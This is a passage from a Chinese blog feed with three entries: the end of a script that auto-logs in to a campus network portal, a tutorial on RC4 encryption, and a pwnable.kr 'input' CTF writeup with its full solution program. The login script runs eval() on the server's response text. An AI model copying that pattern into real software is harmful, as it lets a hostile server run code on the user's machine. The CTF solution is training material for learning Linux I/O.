class="string">&quot;ip:&quot;</span>,ip)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_token</span>():</span></span><br><span class="line">    <span class="comment"># print(&quot;获取token&quot;)</span></span><br><span class="line">    <span class="keyword">global</span> token</span><br><span class="line">    get_challenge_params=&#123;</span><br><span class="line">        <span class="string">&quot;callback&quot;</span>: <span class="string">&quot;jQuery112406608265734960486_&quot;</span>+<span class="built_in">str</span>(<span class="built_in">int</span>(time.time()*<span class="number">1000</span>)),</span><br><span class="line">        <span class="string">&quot;username&quot;</span>:username,</span><br><span class="line">        <span class="string">&quot;ip&quot;</span>:ip,</span><br><span class="line">        <span class="string">&quot;_&quot;</span>:<span class="built_in">int</span>(time.time()*<span class="number">1000</span>),</span><br><span class="line">    &#125;</span><br><span class="line">    get_challenge_res=requests.get(get_challenge_api,params=get_challenge_params,headers=header)</span><br><span class="line">    token=re.search(<span class="string">&#x27;&quot;challenge&quot;:&quot;(.*?)&quot;&#x27;</span>,get_challenge_res.text).group(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(get_challenge_res.text)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;token为:&quot;</span>+token)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">do_complex_work</span>():</span></span><br><span class="line">    <span class="keyword">global</span> i,hmd5,chksum</span><br><span class="line">    i=get_info()</span><br><span class="line">    i=<span class="string">&quot;&#123;SRBX1&#125;&quot;</span>+get_base64(get_xencode(i,token))</span><br><span class="line">    hmd5=get_md5(password,token)</span><br><span class="line">    chksum=get_sha1(get_chksum())</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;所有加密工作已完成&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>():</span></span><br><span class="line">    srun_portal_params=&#123;</span><br><span class="line">    <span class="string">&#x27;callback&#x27;</span>: <span class="string">&#x27;jQuery11240645308969735664_&#x27;</span>+<span class="built_in">str</span>(<span class="built_in">int</span>(time.time()*<span class="number">1000</span>)),</span><br><span class="line">    <span class="string">&#x27;action&#x27;</span>:<span class="string">&#x27;login&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;username&#x27;</span>:username,<span class="comment">#username,</span></span><br><span class="line">    <span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;&#123;MD5&#125;&#x27;</span>+hmd5,</span><br><span class="line">    <span class="string">&#x27;ac_id&#x27;</span>:ac_id,</span><br><span class="line">    <span class="string">&#x27;ip&#x27;</span>:ip,</span><br><span class="line">    <span class="string">&#x27;chksum&#x27;</span>:chksum,</span><br><span class="line">    <span class="string">&#x27;info&#x27;</span>:i,</span><br><span class="line">    <span class="string">&#x27;n&#x27;</span>:n,</span><br><span class="line">    <span class="string">&#x27;type&#x27;</span>:<span class="built_in">type</span>,</span><br><span class="line">    <span class="string">&#x27;os&#x27;</span>:<span class="string">&#x27;windows+10&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;windows&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;double_stack&#x27;</span>:<span class="number">0</span>,</span><br><span class="line">    <span class="string">&#x27;_&#x27;</span>:<span class="built_in">int</span>(time.time()*<span class="number">1000</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">print</span>(srun_portal_params)</span><br><span class="line">    srun_portal_res=requests.get(srun_portal_api,params=srun_portal_params,headers=header)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;ok&#x27;</span> <span class="keyword">in</span> srun_portal_res.text:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;登陆成功&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        error_msg=<span class="built_in">eval</span>(re.search(<span class="string">&#x27;\((.*?)\)&#x27;</span>,srun_portal_res.text).group(<span class="number">1</span>))</span><br><span class="line">        <span class="comment">#输出错误信息</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;error_type:&#x27;</span>+error_msg[<span class="string">&#x27;error&#x27;</span>])</span><br><span class="line">        <span class="built_in">print</span>(error_msg[<span class="string">&#x27;error_msg&#x27;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">global</span> username,password</span><br><span class="line">    username=<span class="string">&quot;&quot;</span><span class="comment">#你的用户名和密码，注意加上@cmcc(移动) 或者@chinanet(电信)，联通是啥就忘了。。</span></span><br><span class="line">    password=<span class="string">&quot;&quot;</span></span><br><span class="line">    init_getip()</span><br><span class="line">    get_token()</span><br><span class="line">    do_complex_work()</span><br><span class="line">    login()</span><br></pre></td></tr></table></figure><p>本学生来自嘉兴学院，同校校友可以换上自己的用户名和密码直接用，如果不是的话把url替换一下应该问题也不大。</p><p>以后上网终于不用再输用户名密码了，只能说爽(狗头</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>RC4加密的学习</title>
      <link href="/2021/11/27/RC4%E5%AD%A6%E4%B9%A0/"/>
      <url>/2021/11/27/RC4%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>最近有点颓废了，想学内核很难进行，逆向光刷题看着也很难，pwn刷题就是处于刷的感觉似曾相识，没有一点提升的感觉，所以我决定先攻一下逆向，把常见加解密算法先学了，今天先来这个RC4</p><span id="more"></span><h2 id="RC4加密"><a href="#RC4加密" class="headerlink" title="RC4加密"></a>RC4加密</h2><p>我初识RC4是在国赛，记得很清楚的一点就是不停地取模256，那题当时靠着网上资料勉强算过去了。但是还是想系统地学一下，网上教程千篇一律，我决定自己模拟一边它的算法过程然后再理解一遍。</p><p>既然是加密，脱离不了三个概念，明文，密文，密钥。RC4是对称加密，我也才知道，一直以为是不可逆的那种hash加密，所以既然它是对称加密，那么对于加密和解密过程，他们所用的密钥相同。它生成密钥的过程如下：</p><p>生成密钥需要一个长度不多于256长度的字符串作为种子生成随机密钥，这是我自己的理解，因为它确实给我的感觉就是这样的随机。它初始生成了一个长度为256的S串，初始S[i]=i，后面根据用字符串种子作为一个变换规则T，交换S密钥里的各个值，这样的交换好处在于我们可以保证S串密钥为一个双射（满足单射和满射，这个概念高中应该讲过，不赘述）。然后给的一个字符串种子呢，就会被放进T中，T的长度也为256，如果所给字符串种子长度小于256，则会进行轮换，直到它长度严格等于256为止。举个例子，在RC4加密中，如果我给定字符串种子为abcd，那么T的值将是[‘a’,’b’,’c’,’d’,’a’,’b’,’c’,’d’,’a’,’b’,’c’,’d’,……’a’,’b’,’c’,’d’]，对于任意0&lt;=i&lt;256，</p><p>T[i]=Seed[i%len(Seed)]</p><p>那么有了这个T之后呢，我们可以开始进行密钥变换了，做以下规则的变换(字符串均转成ASCII码计算)：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">j=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    j=(j+S[i]+T[i])%<span class="number">256</span></span><br><span class="line">    swap(S[i],S[j])</span><br></pre></td></tr></table></figure><p>从这一步我们也可以看出来，S初值我们都是知道的，T在确定了字符串种子之后也是确定的，那么由此可以算出密钥S。我们平时习惯说那个字符串是密钥，但是从这里可以看出来，字符串只是用来确定密钥的，因为在这之后，T和给的字符串已经都用不到了。所以这也是我为什么说那个字符串是种子而不是密钥，因为它没有参与加密的运算，我们刚刚算的那么快乐压根都没有出现明文这种，没有明文怎么能算加密呢对吧。</p><p>最后我们看看它是如何加密的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(m)):</span><br><span class="line">    i=(i+<span class="number">1</span>)%<span class="number">256</span></span><br><span class="line">    j=(j+S[i])%<span class="number">256</span></span><br><span class="line">    c[k]=m[k]^S[(S[i]+S[j])%<span class="number">256</span>]</span><br><span class="line">    </span><br></pre></td></tr></table></figure><p>有木有感觉很熟悉，跟前面生成密钥的算法差不多。这个算法如果不了解RC4，直接逆上去的话，怕能直接破防。我有体会我给你们演示一遍，首先i初值知道，c[k]知道，然后要算明文的话m[k]=c[k]^S[(S[i]+S[j])%256]然后呢，i最终值不知道，j最终值不知道，就，时间静止了呗。但是其实它最后就做一个异或，就不用管它了呗，跟它一样从头往后再异或一遍，不就回来了吗。这也就是它为什么也叫对称加密，它不仅密钥用的是一个，加密解密算法都是一样的，没错，加密即解密。RC4解密只需要对密文再加密一次就可以得到明文了。</p><h2 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">m=<span class="string">&#x27;I love xia0ji233&#x27;</span></span><br><span class="line">S=[i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>)]</span><br><span class="line">key=<span class="string">&#x27;cat flag&#x27;</span></span><br><span class="line">T=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> S:</span><br><span class="line">    T.append(key[i%<span class="built_in">len</span>(key)])</span><br><span class="line">j=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    j=(j+S[i]+<span class="built_in">ord</span>(T[i]))%<span class="number">256</span></span><br><span class="line">    t=S[i]</span><br><span class="line">    S[i]=S[j]</span><br><span class="line">    S[j]=t</span><br><span class="line"></span><br><span class="line">i,j=<span class="number">0</span>,<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(m)):</span><br><span class="line">    i=(i+<span class="number">1</span>)%<span class="number">256</span></span><br><span class="line">    j=(j+S[i])%<span class="number">256</span></span><br><span class="line">    t=<span class="built_in">ord</span>(m[k])^S[(S[i]+S[j])%<span class="number">256</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(t)[<span class="number">2</span>:],end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#2ef1bae658e6e938ca2af63e95e372d</span></span><br></pre></td></tr></table></figure><p>把它放到CyberChef中加密发现结果一致，本次可能说就是学了个寂寞吧，因为我最后只要知道它加密解密算法一致这个结论就可以了。但是最重要的还是学会了如何分辨这样的加解密以及它加解密的一个特性，也算小有成就吧，瞬间不emo了哈哈哈哈。</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> crypto </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>pwnable input writeup</title>
      <link href="/2021/11/23/pwnable_input/"/>
      <url>/2021/11/23/pwnable_input/</url>
      
        <content type="html"><![CDATA[<p>真的推荐学linux C的IO一定得做做这个，真的能学到很多。</p><span id="more"></span><p>连接远程服务器把源码下下来。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>* envp[])</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Welcome to pwnable.kr\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Let&#x27;s see if you know how to give input to program\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Just give me correct inputs then you will get the flag :)\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// argv</span></span><br><span class="line">    <span class="keyword">if</span>(argc != <span class="number">100</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[<span class="string">&#x27;A&#x27;</span>],<span class="string">&quot;\x00&quot;</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[<span class="string">&#x27;B&#x27;</span>],<span class="string">&quot;\x20\x0a\x0d&quot;</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Stage 1 clear!\n&quot;</span>);    </span><br><span class="line"></span><br><span class="line">    <span class="comment">// stdio</span></span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">4</span>];</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">4</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">&quot;\x00\x0a\x00\xff&quot;</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    read(<span class="number">2</span>, buf, <span class="number">4</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">&quot;\x00\x0a\x02\xff&quot;</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Stage 2 clear!\n&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// env</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strcmp</span>(<span class="string">&quot;\xca\xfe\xba\xbe&quot;</span>, getenv(<span class="string">&quot;\xde\xad\xbe\xef&quot;</span>))) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Stage 3 clear!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// file</span></span><br><span class="line">    FILE* fp = fopen(<span class="string">&quot;\x0a&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!fp) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>( fread(buf, <span class="number">4</span>, <span class="number">1</span>, fp)!=<span class="number">1</span> ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>( <span class="built_in">memcmp</span>(buf, <span class="string">&quot;\x00\x00\x00\x00&quot;</span>, <span class="number">4</span>) ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    fclose(fp);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Stage 4 clear!\n&quot;</span>);    </span><br><span class="line"></span><br><span class="line">    <span class="comment">// network</span></span><br><span class="line">    <span class="keyword">int</span> sd, cd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">saddr</span>, <span class="title">caddr</span>;</span></span><br><span class="line">    sd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(sd == <span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;socket error, tell admin\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    saddr.sin_family = AF_INET;</span><br><span class="line">    saddr.sin_addr.s_addr = INADDR_ANY;</span><br><span class="line">    saddr.sin_port = htons( atoi(argv[<span class="string">&#x27;C&#x27;</span>]) );</span><br><span class="line">    <span class="keyword">if</span>(bind(sd, (struct sockaddr*)&amp;saddr, <span class="keyword">sizeof</span>(saddr)) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;bind error, use another port\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    listen(sd, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">int</span> c = <span class="keyword">sizeof</span>(struct sockaddr_in);</span><br><span class="line">    cd = accept(sd, (struct sockaddr *)&amp;caddr, (<span class="keyword">socklen_t</span>*)&amp;c);</span><br><span class="line">    <span class="keyword">if</span>(cd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;accept error, tell admin\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>( recv(cd, buf, <span class="number">4</span>, <span class="number">0</span>) != <span class="number">4</span> ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">&quot;\xde\xad\xbe\xef&quot;</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Stage 5 clear!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// here&#x27;s your flag</span></span><br><span class="line">    system(<span class="string">&quot;/bin/cat flag&quot;</span>);    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>源码大概意思就是给程序五种输入方法，如果程序从指定方法获得了对应的值那么这一关被判正确并且进入下一关，过去五关就能拿到flag。</p><p>第一关是命令行输入，要求命令行有100个参数，然后argv[‘A’]=”\x00”，argv[‘B’]=”\x20\x0a\x0d”，那就给命令行一百个参数，然后满足一下对应的要求即可，这里我们可以选择用execve去执行这个程序。然后程序构造命令行的参数传给第二个参数就可以通过第一关了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">char</span> *arg[<span class="number">101</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">100</span>;i++)&#123;</span><br><span class="line">        arg[i]=(<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">        *arg[i]=<span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    arg[<span class="number">100</span>]=<span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">strcpy</span>(arg[<span class="string">&#x27;B&#x27;</span>],<span class="string">&quot;\x20\x0a\x0d&quot;</span>);</span><br><span class="line">    execve(<span class="string">&quot;./input&quot;</span>,arg,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行就可以发现第一关过去了，这个源码可以放在自己电脑编译然后测试哦，等到自己能打通了再去考虑服务器的环境。</p><p>第二关虽然是stdio，但是它这里不仅要求读取特殊字节，还要从stderr中读入特定字节。这里卡了有点久，最后还是google了一下才得到的一个好方法，这里我也贴一下这位师傅这篇博客，我做这个也是参照这位师傅的博客做的–&gt;<a href="https://r00tk1ts.github.io/2018/03/06/input/%EF%BC%8C%E7%89%B9%E6%AD%A4%E6%84%9F%E8%B0%A2%EF%BC%81">https://r00tk1ts.github.io/2018/03/06/input/，特此感谢！</a></p><p>这里呢选择fork一个子进程，然后父子进程用管道通信，父进程把管道接口定向到stdin和stderr后去执行input。子进程通过管道给父进程发送数据，然后父进程就能从stdin和stderr中得到数据了。</p><p>第三关也比较简单，从环境变量中获得对应数据。环境变量其实跟命令行参数输入差不多，execve第三个参数就是环境变量，传入一个指针数组，然后里面给一个xxx=yyy，那么它从环境变量中get(xxx)就会获得yyy。</p><p>第四个就更简单了，它从文件读你就对应写一个文件给它好了。</p><p>第五个稍微有点东西，是关于socket编程的，基本上也可以超，但是也遇到诸多问题，我一个exp并不能打通，我运行一个exp之后会被挂起，我再运行一个exp才能让第一个exp getflag，盲猜是它数据没接收到，我测试之后发现sleep也不管用，但是这一关已经能打过去了。</p><p>但是由于pwnable服务器的特殊机制，我们home 目录没有写的权限，所以得去寻找我们文件能落地的地方，那就是/tmp目录，这里的目录我们有写的权限，但是没有读的权限，所以我们在里面新建一个自己的文件夹，然后把input可执行文件和flag文件链接到这个目录来，最后上传exp执行就可以拿到flag了。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    FILE *fd=fopen(<span class="string">&quot;\x0a&quot;</span>,<span class="string">&quot;w&quot;</span>);</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">8</span>];</span><br><span class="line">    <span class="built_in">memset</span>(buf,<span class="number">0</span>,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">    fwrite(buf,<span class="number">1</span>,<span class="number">4</span>,fd);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> pipe_stdin[<span class="number">2</span>]=&#123;<span class="number">-1</span>,<span class="number">-1</span>&#125;,pipe_stderr[<span class="number">2</span>]=&#123;<span class="number">-1</span>,<span class="number">-1</span>&#125;;</span><br><span class="line">    <span class="keyword">char</span> *arg[<span class="number">101</span>];</span><br><span class="line">    <span class="keyword">char</span> *env[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">100</span>;i++)&#123;</span><br><span class="line">        arg[i]=(<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">        *arg[i]=<span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    arg[<span class="number">100</span>]=<span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">strcpy</span>(arg[<span class="string">&#x27;B&#x27;</span>],<span class="string">&quot;\x20\x0a\x0d&quot;</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(arg[<span class="string">&#x27;C&#x27;</span>],<span class="string">&quot;55555&quot;</span>);</span><br><span class="line">    env[<span class="number">0</span>]=(<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(env[<span class="number">0</span>],<span class="string">&quot;\xde\xad\xbe\xef=\xca\xfe\xba\xbe&quot;</span>);</span><br><span class="line">    env[<span class="number">1</span>]=<span class="literal">NULL</span>;</span><br><span class="line">    pipe(pipe_stdin);</span><br><span class="line">    pipe(pipe_stderr);</span><br><span class="line">    <span class="keyword">int</span> p=fork();</span><br><span class="line">    <span class="keyword">if</span>(p==<span class="number">0</span>)&#123;</span><br><span class="line">        write(pipe_stdin[<span class="number">1</span>],<span class="string">&quot;\x00\x0a\x00\xff&quot;</span>,<span class="number">4</span>);</span><br><span class="line">        write(pipe_stderr[<span class="number">1</span>],<span class="string">&quot;\x00\x0a\x02\xff&quot;</span>,<span class="number">4</span>);</span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        dup2(pipe_stdin[<span class="number">0</span>],<span class="number">0</span>);</span><br><span class="line">        dup2(pipe_stderr[<span class="number">0</span>],<span class="number">2</span>);</span><br><span class="line">        execve(<span class="string">&quot;./input&quot;</span>,arg,env);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//sleep(1);</span></span><br><span class="line">    <span class="keyword">int</span> sockfd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">saddr</span>;</span></span><br><span class="line">    sockfd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">    saddr.sin_family = AF_INET;</span><br><span class="line">    saddr.sin_addr.s_addr = inet_addr(<span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line">    saddr.sin_port = htons(<span class="number">55555</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;connenct\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(connect(sockfd, (struct sockaddr*)&amp;saddr, <span class="keyword">sizeof</span>(saddr)) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;Cannot connect to server!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    write(sockfd, <span class="string">&quot;\xde\xad\xbe\xef&quot;</span>, <span class="number">4</span>);</span><br><span class="line">    close(sockfd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>flag:<code>Mommy! I learned how to pass various input in Linux :)</code></p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> IO </category>
          
      </categories>
      
      
    </entry>
    
    
